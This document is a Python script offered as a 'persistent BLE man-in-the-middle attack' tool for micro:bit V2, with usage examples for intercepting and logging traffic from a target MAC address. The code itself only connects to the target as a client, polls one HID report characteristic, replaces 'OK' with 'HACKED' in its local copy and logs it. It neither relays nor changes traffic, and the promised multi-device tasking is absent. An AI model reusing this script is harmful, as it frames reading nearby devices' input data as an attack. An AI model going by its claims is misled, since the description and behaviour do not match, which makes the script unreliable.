# microbit_ble_persistent_mitm.py

"""
Persistent BLE Man-in-the-Middle (MitM) Attack for micro:bit V2 (Multi-Device Support)

This script establishes a persistent BLE MitM attack, intercepting and modifying data between a BLE device and its paired host.
- Detects available micro:bit devices and assigns tasks dynamically
- Intercepts and modifies BLE traffic (`--intercept <target_mac>`)
- Logs captured data for analysis (`--log <file>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Intercept and modify BLE traffic:
   ```sh
   python microbit_ble_persistent_mitm.py --intercept AA:BB:CC:DD:EE:FF
   ```

2. Log intercepted data for analysis:
   ```sh
   python microbit_ble_persistent_mitm.py --log mitm_log.txt
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import datetime
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Persistent MitM Attack
async def ble_mitm_intercept(target_mac, log_file):
    """Intercepts and modifies BLE packets between a target device and host."""
    print(f"[+] Establishing BLE MitM attack on {target_mac}...")
    captured_packets = []
    async with BleakClient(target_mac) as client:
        while True:
            try:
                data = await client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                modified_data = data.replace(b"OK", b"HACKED")  # Modify data example
                timestamp = datetime.datetime.now().isoformat()
                captured_packets.append(f"{timestamp} | {target_mac} | {modified_data.hex()}")
                print(f"[+] Intercepted & Modified: {modified_data.hex()}")
                if log_file:
                    with open(log_file, "a") as f:
                        f.write(f"{timestamp} | {target_mac} | {modified_data.hex()}\n")
            except Exception as e:
                print(f"[-] Error intercepting packet: {e}")
            await asyncio.sleep(0.1)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Persistent BLE MitM Attack for micro:bit V2")
    parser.add_argument("--intercept", metavar="target_mac", help="Intercept and modify BLE traffic from a target device")
    parser.add_argument("--log", metavar="file", help="Log intercepted data for later analysis")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.intercept:
        loop.run_until_complete(ble_mitm_intercept(args.intercept, args.log))
